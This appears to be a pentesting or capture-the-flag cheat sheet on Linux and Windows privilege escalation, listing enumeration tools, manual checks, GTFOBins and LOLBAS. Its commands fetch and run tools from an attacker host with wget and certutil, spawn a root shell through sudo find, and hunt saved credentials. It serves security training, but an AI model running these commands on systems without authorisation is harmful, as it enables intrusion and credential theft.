# ⬆️ Privilege Escalation Cheat Sheet

After you land a low-priv shell, the goal is **root** (Linux) or **SYSTEM/Administrator** (Windows). This page covers the enumeration tools that find the path, plus the two reference databases (**GTFOBins** / **LOLBAS**) every pentester keeps open.

> 💡 **Always stabilise your shell first** (see [shells](../shells)) — a broken TTY makes privesc miserable.

---

## 🔁 Automated enumeration

| Tool | Platform | Command | Finds |
| --- | --- | --- | --- |
| **LinPEAS** | Linux | `./linpeas.sh` | SUID, cron, creds, kernel, misconfigs (colour-coded by risk) |
| **WinPEAS** | Windows | `.\winPEAS.exe` | Services, tokens, creds, AutoRuns, unquoted paths |
| **linux-smart-enum** | Linux | `./lse.sh -l1` | Cleaner, levelled Linux enum |
| **pspy** | Linux | `./pspy64` | Watch processes & **cron jobs run in real time** (no root needed) |
| **PowerUp** | Windows | `Invoke-AllChecks` | PowerShell-based Windows privesc checks |
| **Seatbelt** | Windows | `Seatbelt.exe -group=all` | Host survey for privesc leads |

```bash
# Quick way to get tools onto the box (from your attack host)
python3 -m http.server 80                  # serve the file
# on target:
wget http://10.8.0.1/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

---

## 🐧 Linux — manual checks

| Command | Looks for |
| --- | --- |
| `sudo -l` | Commands you can run as root (→ check [GTFOBins](https://gtfobins.github.io)) |
| `find / -perm -4000 -type f 2>/dev/null` | **SUID** binaries (→ GTFOBins) |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
| `getcap -r / 2>/dev/null` | Files with capabilities (e.g. `cap_setuid`) |
| `cat /etc/crontab` & `ls -la /etc/cron*` | Scheduled jobs you might hijack |
| `uname -a` | Kernel version (→ kernel exploit?) |
| `cat /etc/passwd` | Users; writable? = add your own |
| `find / -writable -type d 2>/dev/null` | Writable dirs for payloads |
| `history` / `cat ~/.bash_history` | Leftover creds |

## 🪟 Windows — manual checks

| Command | Looks for |
| --- | --- |
| `whoami /priv` | Token privileges (`SeImpersonate`→Potatoes, `SeBackup`, `SeDebug`) |
| `whoami /groups` | Group memberships |
| `systeminfo` | OS/patch level (→ exploit DB) |
| `wmic service get name,pathname,startmode` | **Unquoted service paths** |
| `sc qc <service>` | Service config / weak permissions |
| `reg query HKLM\...\Winlogon` | AutoLogon creds |
| `cmdkey /list` | Saved credentials |
| `findstr /si password *.txt *.ini *.config` | Creds in files |

---

## 📚 The two reference DBs

| Database | Use it when | Idea |
| --- | --- | --- |
| **[GTFOBins](https://gtfobins.github.io)** | You have `sudo`/SUID on a Unix binary | Shows how to abuse e.g. `find`, `vim`, `tar`, `less` to spawn a root shell |
| **[LOLBAS](https://lolbas-project.github.io)** | On Windows, living off the land | Legit MS binaries (`certutil`, `bitsadmin`, `mshta`) used to download/execute/bypass |

```bash
# Classic GTFOBins example: sudo find → root shell
sudo find . -exec /bin/sh \; -quit

# Classic LOLBAS example: download with certutil
certutil -urlcache -f http://10.8.0.1/shell.exe shell.exe
```

---

## 🧭 Typical workflow

```text
1. Stabilise shell  →  see ../shells
2. Run the right PEAS (linpeas.sh / winPEAS.exe) and read the RED/YELLOW hits
3. Triage the obvious: sudo -l, SUID, whoami /priv, cron/services
4. Match a finding to GTFOBins / LOLBAS / an exploit
5. Escalate → grab the root/SYSTEM flag and loot creds for lateral movement
```

> 🔗 Cracked-out creds → [john](../john)/[hashcat](../hashcat). Move on with them → [netexec](../netexec)/[evil-winrm](../evil-winrm).
